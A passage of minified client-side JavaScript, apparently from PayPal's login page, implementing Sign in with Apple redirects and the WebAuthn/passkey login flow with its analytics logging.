n.CAL_TYPE="SIAPPLE",n.handleLinkAndRedirect=function(r){return r=r||{},t.log({evt:n.CAL_TYPE,data:"PROCESS_HANDLE_LINK_AND_REDIRECT",calEvent:!0}),t.pushLogs(),function i(t){return e.makeServerRequestAndReturnPromise("/signin/oauth2/apple/link",{method:"POST",data:t})}(r).then((function(){return window.location.replace(r.returnUrl)})).catch((function(){return t.log({evt:n.CAL_TYPE,data:"FAILED_HANDLE_LINK_AND_REDIRECT_AJAX",calEvent:!0}),t.pushLogs(),window.location.replace(r.returnUrl)}))},n.handleActivateAndRedirect=function(t){return function s(t){return e.makeServerRequestAndReturnPromise("/signin/oauth2/apple/activate",{method:"POST",data:t})}(t=t||{}).then((function(n){return n=n||{},window.location.replace(n.returnUrl||t.returnUrl)})).catch((function(){return window.location.replace(t.requestUrl||t.returnUrl)}))},n.handleAuthFailure=function(r){return r=r||{},t.log({evt:n.CAL_TYPE,data:"PROCESS_HANDLE_AUTH_FAILURE",calEvent:!0}),t.pushLogs(),window.location.replace(r.returnUrl)},n.triggerOptin=function(s,o){t.log({evt:n.CAL_TYPE,data:"PROCESS_TRIGGER_OPTIN",calEvent:!0}),t.log({evt:"state_name",data:"begin_siapple_interstitial",instrument:!0}),t.log({evt:"transition_name",data:"prepare_siapple_interstitial",instrument:!0}),t.pushLogs();var u=s.authUrl,a=o.returnUrl,f=document.querySelector("section#siappleOptinInterstitial"),l=f&&f.querySelector("button.siappleConnectBtn.button.actionContinue"),c=f&&f.querySelector("a.siappleDecline");l&&l.addEventListener("click",(function(t){l.disabled=!0,r("connect",u)(t)})),c&&c.addEventListener("click",(function(n){e.showSpinner(),r("decline",a)(n)}))},n.triggerActivate=function(r){return t.log({evt:n.CAL_TYPE,data:"PROCESS_TRIGGER_ACTIVATE",calEvent:!0}),t.log({evt:"state_name",data:"begin_siapple_login",instrument:!0}),t.log({evt:"transition_name",data:"prepare_siapple_login",instrument:!0}),t.pushLogs(),window.location.assign(r.authUrl)},n}();login.siapple=function(e){function n(e,t){var n=$(e);return n?n.data(t):null}var t=login.utils;return function(i){i=i||{};var s=document.querySelector("section#siappleOptinInterstitial"),o=document.querySelector("section#siappleRedirectInterstitial"),u=i.appleIdpJson||n(s,"appleIdpJson"),a=i.siAppleOptinDataJson||n(s,"siAppleOptinDataJson"),f=n(o,"siAppleRedirectDataJson"),l=t.parseJsonSafe(u)||{},c=t.parseJsonSafe(a)||{},h=t.parseJsonSafe(f)||{};return c.isSiAppleOptinRequired&&l.authUrl&&c.returnUrl?e.triggerOptin(l,c):l.isLinked&&l.authUrl?(t.addHiddenElementIfNotExist("isSiAppleActivationProcessing",!0,document.body),e.triggerActivate(l)):h.isOptin&&h.returnUrl?e.handleLinkAndRedirect(h):h.isLinked&&h.returnUrl?e.handleActivateAndRedirect(h):h.isFailed&&h.returnUrl?e.handleAuthFailure(h):void 0}}(SiApple),document.onreadystatechange=function(){"complete"===document.readyState&&login.siapple&&login.siapple()},login.webAuthn=function(){function o(e){var n,t=e&&e.webAuthnLoginContext||$("body").data("webAuthnLoginContext");if(t){try{n=JSON.parse(t)}catch(s){}return n}i&&(login.storageUtils.removeDataByUserId("wanId",i),login.logger.log({evt:"webauthn_cred",data:"cred_no_ctx",instrument:!0}),login.logger.log({evt:r,data:"CRED_NO_CTX",calEvent:!0}),login.logger.pushLogs())}function l(){var e=document.querySelector("#serviceError"),n=document.querySelector(".webAuthnDisplayCredentials"),r=document.querySelector("#webAuthnLogin"),i=$("body").data("usePassKey");e&&(t.hideSpinner(),$(e).removeClass("hide"),n&&$(n).addClass("hide"),r&&$(r).addClass("hide"),i?login.logger.log({evt:"state_name",data:"passkey_login",instrument:!0}):login.logger.log({evt:"state_name",data:"webauthn_login",instrument:!0}),login.logger.log({evt:"transition_name",data:"prepare_error_page",instrument:!0}),login.logger.log({evt:"SERVICE_ERROR_PAGE",data:"SHOW_ERROR_PAGE_LOGIN",calEvent:!0}),login.logger.pushLogs())}function c(e){var t=$("body").data("isUvpaaExist"),n=$("body").data("webAuthnLoginContext"),r=$("body").data("usePassKey"),i=document.getElementById("logIn_start")&&document.getElementById("logIn_start").value,s=$("body").data("deviceOS"),o=login.utils.getIntent();return login.utils.showSpinner(),eventPreventDefault(e),r?(login.logger.log({evt:"variant",data:"cookied_passkey",instrument:!0}),login.logger.log({evt:"state_name",data:"begin_passkey_login",instrument:!0}),login.logger.log({evt:"transition_name",data:"process_login_button_click",instrument:!0}),login.logger.log({evt:"event_name",data:"\tidentity_returning_login_continue_pressed",instrument:!0}),login.logger.log({evt:"product",data:"\tidentity",instrument:!0})):(login.logger.log({evt:"state_name",data:"webauthn_login",instrument:!0}),login.logger.log({evt:"transition_name",data:"prepare_login",instrument:!0}),login.logger.log({evt:"button_label",data:"log_in",instrument:!0})),login.logger.log({evt:login.webAuthnUtils.checkCalLogsType(i),data:"WEBAUTH_N_CLIENT_CLICKED_WEBAUTHN_LOGIN"+s,calEvent:!0}),login.logger.log({evt:login.webAuthnUtils.checkCalLogsType(i)+"_"+o+"_"+s,data:"WEBAUTH_N_CLIENT_CLICKED_WEBAUTHN_LOGIN"+s,calEvent:!0}),login.logger.pushLogs(),"false"===t?(login.logger.log({evt:"WEBAUTH_N_CLIENT",data:"ERROR_UVPAA_NOT_ENABLED",calEvent:!0}),login.logger.log({evt:"WEBAUTH_N_CLIENT_"+o+"_"+s,data:"ERROR_UVPAA_NOT_ENABLED",calEvent:!0}),login.logger.pushLogs(),l()):n?login.webAuthn.performWebAuthnLogin({cookiedPasskey:!0}):void y().then((function(e){return e.webAuthnLoginContext?(login.logger.log({evt:"state_name",data:"webauthn_login",instrument:!0}),login.logger.log({evt:"transition_name",data:"prepare_login_context_lookup_success",instrument:!0}),login.logger.log({evt:login.webAuthnUtils.checkCalLogsType(i),data:"PROCESS_LOGIN_CONTEXT_LOOKUP_SUCCESS"+s,calEvent:!0,status:"ERROR"}),login.logger.log({evt:login.webAuthnUtils.checkCalLogsType(i)+"_"+o+"_"+s,data:"PROCESS_LOGIN_CONTEXT_LOOKUP_SUCCESS"+s,calEvent:!0,status:"ERROR"}),login.logger.pushLogs(),$("body").attr("data-web-authn-login-context",e.webAuthnLoginContext),void login.webAuthn.performWebAuthnLogin()):Promise.reject("service error")})).catch((function(){return login.logger.log({evt:"state_name",data:"webauthn_login",instrument:!0}),login.logger.log({evt:"transition_name",data:"prepare_login_context_lookup_failed_login_click",instrument:!0}),login.logger.log({evt:login.webAuthnUtils.checkCalLogsType(i),data:"PROCESS_LOGIN_CONTEXT_LOOKUP_FAILED_LOGIN_CLICK"+s,calEvent:!0,status:"ERROR"}),login.logger.log({evt:login.webAuthnUtils.checkCalLogsType(i)+"_"+o+"_"+s,data:"PROCESS_LOGIN_CONTEXT_LOOKUP_FAILED_LOGIN_CLICK"+s,calEvent:!0,status:"ERROR"}),login.logger.pushLogs(),l()}))}function h(){if($("#fpLogIn")){var t=document.querySelector("#logIn_start"),n=document.querySelector("#logIn_notNow"),r=document.querySelector("#logIn_tryAnotherWay"),i=document.querySelector("#error_tryanotherway"),s=document.querySelector("#serviceError"),o=$("body").data("passKeyPlatform"),u=document.getElementById("logIn_start")&&document.getElementById("logIn_start").value,a=$("body").data("deviceOS"),l=login.utils.getIntent();addEvent(t,"click",c),n&&addEvent(n,"click",(function(){o?(login.logger.log({evt:"state_name",data:"begin_passkey_login",instrument:!0}),login.logger.log({evt:"transition_name",data:"process_login_try_another_way_click",instrument:!0}),login.logger.log({evt:"event_name",data:"identity_returning_login_alternate_pressed",instrument:!0}),login.logger.log({evt:"product",data:"identity",instrument:!0})):(login.logger.log({evt:"state_name",data:"webauthn_login",instrument:!0}),login.logger.log({evt:"transition_name",data:"prepare_use_password_instead",instrument:!0}),login.logger.log({evt:"button_label",data:"use_password_instead",instrument:!0})),login.logger.log({evt:login.webAuthnUtils.checkCalLogsType(u),data:"WEBAUTH_N_CLIENT_CLICKED_USE_PASSWORD_INSTEAD"+a,calEvent:!0}),login.logger.log({evt:login.webAuthnUtils.checkCalLogsType(u)+"_"+l+"_"+a,data:"WEBAUTH_N_CLIENT_CLICKED_USE_PASSWORD_INSTEAD"+a,calEvent:!0}),login.logger.pushLogs(),login.utils.loginWithPasswordHandler({integrationType:"webAuthn"})})),r&&(login.utils.hideCurrentPageTawOption("webAuthn"),o?(login.utils.logTryAnotherWayInstrumentData({page:"passkey",action:"linkShown"}),login.logger.pushLogs(),login.utils.attachTryAnotherWayModalHandlers({integrationType:"webAuthn"}),addEvent(r,"click",(function(e){login.logger.log({evt:login.webAuthnUtils.checkCalLogsType(u),data:"PASSKEY_N_CLIENT_CLICKED_TRY_ANOTHER_WAY"+a,calEvent:!0}),login.logger.log({evt:login.webAuthnUtils.checkCalLogsType(u)+"_"+l+"_"+a,data:"PASSKEY_N_CLIENT_CLICKED_TRY_ANOTHER_WAY"+a,calEvent:!0}),login.utils.logTryAnotherWayInstrumentData({page:"passkey",action:"linkPressed"}),login.logger.pushLogs(),login.utils.showTryAnotherWayModal(e,{integrationType:"webAuthn"})}))):(login.utils.logTryAnotherWayInstrumentData({page:"webauthn",action:"linkShown"}),login.logger.pushLogs(),login.utils.attachTryAnotherWayModalHandlers({integrationType:"webAuthn"}),addEvent(r,"click",(function(e){login.logger.log({evt:login.webAuthnUtils.checkCalLogsType(u),data:"WEBAUTH_N_CLIENT_CLICKED_TRY_ANOTHER_WAY"+a,calEvent:!0}),login.logger.log({evt:login.webAuthnUtils.checkCalLogsType(u)+"_"+l+"_"+a,data:"WEBAUTH_N_CLIENT_CLICKED_TRY_ANOTHER_WAY"+a,calEvent:!0}),login.utils.logTryAnotherWayInstrumentData({page:"webauthn",action:"linkPressed"}),login.logger.pushLogs(),login.utils.showTryAnotherWayModal(e,{integrationType:"webAuthn"})})))),s&&(login.utils.logTryAnotherWayInstrumentData({page:"webauthn",action:"linkShown"}),login.logger.pushLogs(),login.utils.attachTryAnotherWayModalHandlers({integrationType:"webAuthn"}),i&&addEvent(i,"click",(function(e){login.logger.log({evt:"state_name",data:"webauthn_login",instrument:!0}),login.logger.log({evt:"transition_name",data:"webauthn_try_another_way_modal",instrument:!0}),login.logger.log({evt:login.webAuthnUtils.checkCalLogsType(u),data:"WEBAUTH_N_SERVICE_ERROR_CLICKED_TRY_ANOTHER_WAY"+a,calEvent:!0}),login.utils.logTryAnotherWayInstrumentData({page:"webauthn",action:"linkPressed"}),login.logger.pushLogs(),login.utils.showTryAnotherWayModal(e,{integrationType:"webAuthn"})}))),function f(){var e=document.querySelector(".webAuthnDisplayCredentials a")||document.querySelector(".passkeyDisplayCredentials a"),t=$("body").data("passKeyPlatform"),n=document.getElementById("logIn_start")&&document.getElementById("logIn_start").value,r=$("body").data("deviceOS");e&&addEvent(e,"click",(function(e){login.utils.showSpinner({nonTransparentMask:!0}),eventPreventDefault(e),t?(login.logger.log({evt:"event_name",data:"identity_returning_login_change_user_pressed",instrument:!0}),login.logger.log({evt:"state_name",data:"begin_passkey_login",instrument:!0}),login.logger.log({evt:"transition_name",data:"process_login_change_user_clicked",instrument:!0}),login.logger.log({evt:"product",data:"identity",instrument:!0})):(login.logger.log({evt:"state_name",data:"begin_webauthn_login",instrument:!0}),login.logger.log({evt:"transition_name",data:"click_not_you",instrument:!0})),login.logger.log({evt:login.webAuthnUtils.checkCalLogsType(n),data:"CLICKED_CHANGE_USER"+r,calEvent:!0}),login.logger.pushLogs(),login.utils.notYouClickHandlerForWebauthnUser(e,(function(){}))}))}()}}function d(e){(function u(e){for(var t=document.querySelector("#main"),n=t.querySelectorAll("section")||[],r=0;r<n.length;r++){var i=n[r].querySelector(".notifications");i&&$(i).text()&&$(i).text(""),$(n[r]).hasClass("hide")||$(n[r]).addClass("hide")}t.insertAdjacentHTML("afterbegin",e),login.footer&&login.footer(),login.countryList&&login.countryList.getCache("countryList")&&login.countryList.showCountryDropDown()})(e),h()}function v(e,n){function b(e){return btoa(new Uint8Array(e).reduce((function(e,t){return e+String.fromCharCode(t)}),""))}function w(e){return Uint8Array.from(atob(e),(function(e){return e.charCodeAt(0)}))}var i,h,r=$("body").data("loadStartTime"),u=o(e),a=$("body").data("usePassKey"),f=document.getElementById("logIn_start")&&document.getElementById("logIn_start").value,c=e.passKeyAutoFill?"uncookiedAutofill":f,p=$("body").data("deviceOS"),d=$("body").data("browserName"),v=$("body").data("cOverride"),m=document.querySelector("#email"),g=login.utils.getIntent();(u||a)&&(u&&u.challenge||v)&&"object"==typeof navigator.credentials&&"function"==typeof navigator.credentials.get&&(a?(login.logger.log({evt:"event_name",data:"identity_passkey_device_consent_occurred",instrument:!0}),login.logger.log({evt:"transition_name",data:"prepare_passkey_consent",instrument:!0}),login.logger.log({evt:"state_name",data:"begin_passkey_login",instrument:!0}),login.logger.log({evt:"product",data:"identity",instrument:!0}),login.logger.log({evt:"login_method",data:"passkeys",instrument:!0}),login.logger.pushLogs(),login.logger.log({evt:"event_name",data:"passkey_eligibility_variant_check_occured",instrument:!0}),!!e.usePassKey&&login.logger.log({evt:"variant",data:"uncookied_passkey_ignore_autofill_"+p,instrument:!0}),!!e.passKeyAutoFill&&login.logger.log({evt:"variant",data:"uncookied_passkey_autofill_"+p,instrument:!0}),!e.usePassKey&&!e.passKeyAutoFill&&login.logger.log({evt:"variant",data:e.passkeyAutoTriggerEligible?"cookied_passkey_auto_trigger"+p:"cookied_passkey_"+p,instrument:!0})):(login.logger.log({evt:"state_name",data:"webauthn_login",instrument:!0}),login.logger.log({evt:"transition_name",data:"prepare_consent",instrument:!0})),login.logger.log({evt:login.webAuthnUtils.checkCalLogsType(c,e.usePassKey),data:login.webAuthnUtils.checkCalLogsType(c,e.usePassKey)+"_PREPARE_CONSENT_LOGIN"+p+"_"+d,calEvent:!0}),login.logger.pushLogs(),e&&e.passKeyAutoFill&&(h={passKeyAutoFill:!0}),e&&e.usePassKey&&m&&!m.hasAttribute("disabled")&&m.setAttribute("disabled","disabled"),function y(e){var a,n=u||{},r=$("body").data("cOverride"),i=n.challenge||r,o=n.rpId||$("body").data("rpId"),f=$("body").data("usePassKey"),l=$("body").data("isAndroid"),c=$("body").data("passkeyAssertion"),h=$("body").data("userVerificationRequired");if(c&&e&&e.passKeyAutoFill)return Promise.resolve(t.parseJsonSafe(c));void 0!==s&&s.abort(),window.AbortController&&(s=new AbortController);var p=s.signal,d={authenticatorSelection:{authenticatorAttachment:"platform"},userVerification:h?"required":"preferred"};return d.challenge=w(i),"timeout"in n&&(d.timeout=n.timeout),d.rpId=o,d.attestation="direct","allowCredentials"in n&&(d.allowCredentials=function E(e){for(var t=[],n=$("body").data("usePassKey"),r=0;r<e.length;r++){var i={};i.type=e[r].type,i.id=w(e[r].id),n||(i.transports=["internal"]),t.push(i)}return t}(n.allowCredentials)),f&&!l&&delete d.authenticatorSelection.authenticatorAttachment,a={publicKey:d},f&&(a.signal=p),navigator.credentials.get(a)}(h).then((function x(n){i=Date.now();var r=document.querySelectorAll("form[name=login] input[type=hidden]"),s={},o={},u=document.querySelector("input[name=login_email]"),a=document.querySelector("input[name=login_phone]"),f=document.querySelector("#phoneCode"),l=$("body").data("usePassKey")||h&&h.passKeyAutoFill,p=function S(e,t,n){var r=login.utils.getSplitLoginContext();return e?"COOKIED_PASSKEY":t?"inputPassword"===r?"COOKIED_AUTOFILL_PASSKEY":"UNCOOKIED_AUTOFILL_PASSKEY":n?"UNCOOKIED_IGNORE_PASSKEY":void 0}(document.getElementById("logIn_start")&&document.getElementById("logIn_start").value,e.passKeyAutoFill,e.usePassKey);p&&(o.passkeyFlowType=p),login.utils.beaverLogger({transition_name:"submit_passkey",status:"success",isRedirect:!0,state:"start"}),e&&e.usePassKey&&m&&m.hasAttribute("disabled")&&m.removeAttribute("disabled"),u=u&&u.value||$("body").data("loginEmail"),a=a&&a.value||$("body").data("loginPhone"),f=f&&f.value||$("body").data("phoneCode"),l?(login.logger.log({evt:"event_name",data:"identity_login_authorization_submission_occurred",instrument:!0}),login.logger.log({evt:"state_name",data:"begin_passkey_login",instrument:!0}),login.logger.log({evt:"transition_name",data:"passkey_login_submit",instrument:!0}),login.logger.log({evt:"login_method",data:"passkeys",instrument:!0}),login.logger.log({evt:"product",data:"identity",instrument:!0}),login.logger.log({evt:"authenticator_attachment",data:n&&n.authenticatorAttachment,instrument:!0}),login.logger.log({evt:p,data:p+"_PREPARE_PROCEED_LOGIN",calEvent:!0})):(login.logger.log({evt:"state_name",data:"webauthn_login",instrument:!0}),login.logger.log({evt:"transition_name",data:"prepare_proceed_login",instrument:!0}),login.logger.log({evt:"WEBAUTH_N_CLIENT",data:"WEBAUTH_N_CLIENT_PREPARE_PROCEED_LOGIN",calEvent:!0})),login.logger.pushLogs();for(var d=0;d<r.length;d++)o[r[d].name]=r[d].value;if(delete o.login_phone,delete o.phoneCode,delete o.login_email,a&&f&&!l?(o.login_phone=a,o.phoneCode=f):u&&!l&&(o.login_email=u),h&&h.passKeyAutoFill){o.webauthn_response=JSON.stringify(n);var v=document.querySelector("form[name=login]");return t.makeServerRequestAndReturnPromise(v&&v.getAttribute("action")||"/signin",{data:o})}if("id"in n&&(s.id=n.id),"type"in n&&(s.type=n.type),"rawId"in n&&(s.rawId=b(n.rawId)),"response"in n){var g={};g.clientDataJSON=b(n.response.clientDataJSON),g.authenticatorData=b(n.response.authenticatorData),g.signature=b(n.response.signature),g.userHandle=b(n.response.userHandle),s.response=g,o.webauthn_response=JSON.stringify(s);v=document.querySelector("form[name=login]");return t.makeServerRequestAndReturnPromise(v&&v.getAttribute("action")||"/signin",{data:o})}return Promise.reject()})).catch((function(n){h&&h.passKeyAutoFill||(t.addHiddenElement("webAuthnEnrolledUser",!0,document.querySelector("form[name=login]")),document.body.setAttribute("data-web-authn-enrolled-user","true")),e&&e.usePassKey&&m&&m.hasAttribute("disabled")&&m.removeAttribute("disabled");var r=n&&n.message||"unknown_error";return login.logger.log({evt:"state_name",data:"begin_fp_login",instrument:!0}),login.logger.log({evt:"transition_name",data:"process_fp_assertion_failed",instrument:!0}),login.logger.log({evt:"ext_error_desc",data:r,instrument:!0}),login.logger.log({evt:login.webAuthnUtils.checkCalLogsType(c,e.usePassKey),data:"PROCESS_FP_ASSERTION_FAILED"+p,calEvent:!0,status:"ERROR"}),login.logger.log({evt:login.webAuthnUtils.checkCalLogsType(c,e.usePassKey),data:"FP_ASSERTION_ERROR_"+p+r,calEvent:!0}),login.logger.log({evt:login.webAuthnUtils.checkCalLogsType(c,e.usePassKey)+"_"+g+"_"+p,data:"PROCESS_FP_ASSERTION_FAILED"+p,calEvent:!0,status:"ERROR"}),login.logger.log({evt:login.webAuthnUtils.checkCalLogsType(c,e.usePassKey)+"_"+g+"_"+p,data:"FP_ASSERTION_ERROR_"+p+r,calEvent:!0}),login.logger.pushLogs(),Promise.reject(n)})).then((function(n){var r=document.getElementById("logIn_start")&&document.getElementById("logIn_start").value;if(n.notifications)return Promise.reject({name:"service error",uncookiedPasskey:!r,notifications:n.notifications});a?(login.logger.log({evt:"variant",data:a&&e.cookiedPasskey?"cookied_passkey":"uncookied_passkey_autofill",instrument:!0}),login.logger.log({evt:"state_name",data:"begin_passkey_login",instrument:!0}),login.logger.log({evt:"transition_name",data:"process_assertion_success",instrument:!0}),login.logger.log({evt:"event_name",data:"identity_login_trigger_occurred",instrument:!0}),login.logger.log({evt:"product",data:"identity",instrument:!0})):e.usePassKey?(login.logger.log({evt:"variant",data:"uncookied_passkey_ignore_autofill",instrument:!0}),login.logger.log({evt:"state_name",data:"begin_passkey_login",instrument:!0}),login.logger.log({evt:"transition_name",data:"process_assertion_success",instrument:!0}),login.logger.log({evt:"event_name",data:"identity_login_trigger_occurred",instrument:!0}),login.logger.log({evt:"product",data:"identity",instrument:!0})):(login.logger.log({evt:"state_name",data:"begin_fp_login",instrument:!0}),login.logger.log({evt:"transition_name",data:"process_fp_login_success",instrument:!0})),login.utils.logCPLData({startTime:i,status:"success",flowName:"passkey_login_auth_success_time"}),login.logger.log({evt:login.webAuthnUtils.checkCalLogsType(c,e.usePassKey),data:"LOGIN_SUCCESS"+p,calEvent:!0}),login.logger.log({evt:login.webAuthnUtils.checkCalLogsType(c,e.usePassKey)+"_"+g+"_"+p,data:"LOGIN_SUCCESS"+p,calEvent:!0}),e.passkeyAutoTriggerEligible&&login.logger.log({evt:login.webAuthnUtils.checkCalLogsType(c,e.usePassKey),data:"AUTO_TRIGGER_LOGIN_SUCCESS_"+p,calEvent:!0,status:"SUCCESS"}),login.logger.pushLogs(),n.returnUrl?window.location.href=n.returnUrl:t.hideSpinner()})).catch((function(i){var s=i&&i.name||"unknown_error",o=i&&i.message||"unknown_error";if(login.logger.log({evt:"state_name",data:"begin_fp_login",instrument:!0}),login.logger.log({evt:"transition_name",data:"process_fp_login_failed",instrument:!0}),login.logger.log({evt:"ext_error_code",data:s,instrument:!0}),login.logger.log({evt:"ext_error_desc",data:o,instrument:!0}),login.logger.log({evt:login.webAuthnUtils.checkCalLogsType(c,e.usePassKey),data:"LOGIN_FAILED_"+p+s,calEvent:!0,status:"ERROR"}),login.logger.log({evt:login.webAuthnUtils.checkCalLogsType(c,e.usePassKey)+"_"+g+"_"+p,data:"LOGIN_FAILED_"+p+s,calEvent:!0,status:"ERROR"}),login.logger.pushLogs(),login.utils.logCPLData({startTime:r,status:"failure",flowName:"Web Authn"}),e.passkeyAutoTriggerEligible&&"NotAllowedError"!==s){login.logger.log({evt:login.webAuthnUtils.checkCalLogsType(c,e.usePassKey),data:"AUTO_TRIGGER_LOGIN_FAILED_"+p+s,calEvent:!0,status:"ERROR"}),login.logger.pushLogs();var u=$("input[name=requestUrl]").val();return u=login.utils.updateParamValue(u,"loginType","login"),void(window.location.href=u)}if(t.hideSpinner(),i.uncookiedPasskey){var a=document.querySelector(".notifications");return $(a).text(""),void(i.notifications&&(a.innerHTML='<p class="notification '+i.notifications.type+'" role="alert">'+i.notifications.msg+"</p>"))}if(e&&(e.usePassKey||e.passkeyAutoTriggerEligible))return n();"NotAllowedError"!==s&&l()})))}function m(e){var n=window.PublicKeyCredential,i=!0,s=$("body").data("disableUvpaaCheck"),o=$("body").data("pwdShowTryAnotherWay")||document.querySelector('input[name="pwdShowTryAnotherWay"]'),u=document.querySelector("#loginWithWebauthn"),f=u&&u.parentElement,l=document.querySelector("#tryAnotherWayLinkContainer"),h="true"===$("body").data("isPasskeyFlow")?"passkey":"webauthn",p=f&&!$(f).hasClass("hide"),d=$("body").data("isNativeLogin")&&!$("body").data("disableWebviewCheckNativeLogin");n&&n.isConditionalMediationAvailable&&n.isConditionalMediationAvailable()?(p&&(login.logger.log({evt:"reason",data:JSON.stringify([{eligibility:"1",reason:h}]),instrument:!0}),login.logger.log({evt:"TAW_ELIGIBLE_REASON",data:h,calEvent:!0,status:"SUCCESS"})),o&&l&&f&&!$(f).hasClass("hide")&&($(l).removeClass("hide"),login.utils.logTryAnotherWayInstrumentData({page:"password",action:"linkShown"})),login.logger.pushLogs()):p&&$(f).addClass("hide"),n&&n.isUserVerifyingPlatformAuthenticatorAvailable&&(login.logger.log({evt:"state_name",data:"begin_fp_UVPAA",instrument:!0}),login.logger.log({evt:"transition_name",data:"process_fp_UVPAA",instrument:!0}),n.isUserVerifyingPlatformAuthenticatorAvailable().then((function(e){return login.logger.log({evt:"eligibility_reason",data:"UVPAA_"+e,instrument:!0}),login.logger.log({evt:r,data:"UVPAA_ELIGIBLE_"+e,calEvent:!0,status:"SUCCESS"}),login.logger.pushLogs(),!0===e&&(t.addHiddenElementIfNotExist("isUVPAAExist","yes",document.querySelector("form[name=login]")),document.body.setAttribute("data-is-uvpaa-exist","true"),s||g()),!1===e?(i=!1,document.body.setAttribute("data-is-uvpaa-exist","false"),Promise.reject(new Error("UVPAA not eligible"))):Promise.resolve(i)})).then((function(){e&&e.webAuthnEnrolledUser&&(t.addHiddenElement("webAuthnEnrolledUser",!0,document.querySelector("form[name=login]")),document.body.setAttribute("data-web-authn-enrolled-user","true"));var n=$("#fpLogIn"),r=$("#login");r&&n&&!n.hasClass("hide")&&(r.addClass("hide"),function a(){var e="safari"===$("body").data("loginExperience"),t=$("#fpLogIn"),n=$("#login");if(t&&!t.hasClass("hide")&&n&&n.hasClass("hide")&&e){var r=document.querySelector("#email"),i=document.querySelector("#password");r&&!r.hasAttribute("disabled")&&r.setAttribute("disabled","disabled"),i&&!i.hasAttribute("disabled")&&i.setAttribute("disabled","disabled")}}())})).catch((function(e){if(login.logger.log({evt:"eligibility_reason",data:"UVPAA_error",instrument:!0}),login.logger.log({evt:r,data:"UVPAA_CHECK_FAILED",calEvent:!0,status:"ERROR"}),login.logger.pushLogs(),document.body.setAttribute("data-is-uvpaa-exist","false"),d)return login.logger.log({evt:"PASSKEY_CLIENT",data:"UNSUPPORTED_NATIVE_LOGIN_UVPAA_REDIRECT",calEvent:!0,status:"SUCCESS"}),void(window.location.href="/signin");var n=$("#fpLogIn"),i=document.getElementById("logIn_start")&&document.getElementById("logIn_start").value;if(n&&!n.hasClass("hide")){var s=$("input[name=requestUrl]").val();return s=login.utils.updateParamValue(s,"loginType","login"),void(window.location.href=s)}i&&t.hideSpinner()})))}function g(){var e=$("body").data("passkeyAutoTriggerEligible"),n=$("#fpLogIn"),r=document.getElementById("logIn_start")&&!document.getElementById("logIn_start").value,i=document.getElementById("logIn_start")&&document.getElementById("logIn_start").value,s=document.querySelector("#logIn_start"),o=$("body").data("isNativeLogin")&&!$("body").data("disableWebviewCheckNativeLogin");if(r)return login.logger.log({evt:"PASSKEY_CLIENT",data:"PASSKEY_AUTOFILL_INELIGIBLE_FOR_WEBAUTHN_LOGIN",calEvent:!0,status:"SUCCESS"}),t.hideSpinner(),void login.logger.pushLogs();if(window.PublicKeyCredential&&window.PublicKeyCredential.isConditionalMediationAvailable&&window.PublicKeyCredential.isConditionalMediationAvailable())return document.body.setAttribute("data-use-pass-key","true"),(i||o)&&t.hideSpinner(),i&&e&&(login.utils.showSpinner(),s&&s.focus(),login.logger.log({evt:"PASSKEY_CLIENT",data:"AUTO_TRIGGER_LOGIN_START",calEvent:!0,status:"SUCCESS"}),v({cookiedPasskey:!0,passkeyAutoTriggerEligible:!0},(function(){login.logger.log({evt:"PASSKEY_CLIENT",data:"AUTO_TRIGGER_ENABLE_LOGIN_BUTTON",calEvent:!0,status:"SUCCESS"}),s&&s.removeAttribute("disabled")}))),i&&!e&&s&&s.removeAttribute("disabled"),login.logger.log({evt:"eligibility_reason",data:"passkey_autofill_eligible",instrument:!0}),login.logger.log({evt:"PASSKEY_CLIENT",data:"PASSKEY_AUTOFILL_ELIGIBLE",calEvent:!0,status:"SUCCESS"}),void login.logger.pushLogs();if(login.logger.log({evt:"eligibility_reason",data:"passkey_autofill_ineligible",instrument:!0}),login.logger.log({evt:"PASSKEY_CLIENT",data:"PASSKEY_AUTOFILL_INELIGIBLE",calEvent:!0,status:"SUCCESS"}),login.logger.pushLogs(),n&&!n.hasClass("hide")){var u=$("input[name=requestUrl]").val();return u=login.utils.updateParamValue(u,"loginType","login"),void(window.location.href=u)}i&&t.hideSpinner()}function y(){var e=document.querySelectorAll("form[name=login] input[type=hidden]"),n=document.getElementById("logIn_start")&&document.getElementById("logIn_start").value,r={},i=$("body").data("deviceOS");login.logger.log({evt:"state_name",data:"webauthn_login",instrument:!0}),login.logger.log({evt:"transition_name",data:"prepare_login_context_lookup",instrument:!0}),login.logger.log({evt:login.webAuthnUtils.checkCalLogsType(n),data:login.webAuthnUtils.checkCalLogsType(n)+"_PREPARE_LOGIN_CONTEXT_LOOKUP"+i,calEvent:!0}),login.logger.pushLogs();for(var s=0;s<e.length;s++)r[e[s].name]=e[s].value;return t.makeServerRequestAndReturnPromise("/signin/webauthn/context",{data:r,hideSpinner:!0})}var s,e=login.utils.createCache(),t=login.utils,n=document.getElementById("logIn_start")&&document.getElementById("logIn_start").value,r="WEBAUTH_N_CLIENT",i=$("body").data("partyIdHash");return window.AbortController&&(s=new AbortController),n&&(login.logger.log({evt:"event_name",data:"identity_returning_login_screen_shown",instrument:!0}),login.logger.log({evt:"state_name",data:"begin_passkey_login",instrument:!0}),login.logger.log({evt:"transition_name",data:"prepare_login_challenge",instrument:!0}),login.logger.log({evt:"login_method",data:"passkeys",instrument:!0}),login.logger.log({evt:"product",data:"identity",instrument:!0}),login.logger.log({evt:"PASSKEY_CLIENT",data:"RENDERED_COOKIED_LOGIN_PAGE",calEvent:!0}),login.logger.pushLogs()),$("body").data("webAuthnEnrolledUser")&&(t.addHiddenElement("webAuthnEnrolledUser",!0,document.querySelector("form[name=login]")),document.body.setAttribute("data-web-authn-enrolled-user","true")),i&&t.addHiddenElement("partyIdHash",i,document.querySelector("form[name=login]")),{setContext:function(t){var n=t&&t.wanSupportLookup||$("body").data("webAuthnSupportLookup"),o=(window.PAYPAL.ulData||{}).aPayAuth,u=$("body").data("userDeviceTokenLogin"),a=$("body").data("webAuthnSkipLookup"),f=$("body").data("webAuthnSkipJunoLookup"),l=$("body").data("suppressWebAuthn"),c=$("body").data("passKeyPlatform"),h=$("body").data("disableUvpaaCheck"),p=document.getElementById("logIn_start")&&document.getElementById("logIn_start").value,v=$("body").data("isNativeLogin");if((n||a||c||v)&&!o&&!u){if(m(t),h&&g(),window.addEventListener("beforeunload",(function(){"undefined"!=typeof autofillAbortController&&autofillAbortController.abort(),void 0!==s&&s.abort()})),l){var b=$("body").data("deviceOS");return login.logger.log({evt:login.webAuthnUtils.checkCalLogsType(p),data:"WEBAUTHN_LOGIN_SUPPRESSED"+b,calEvent:!0}),void 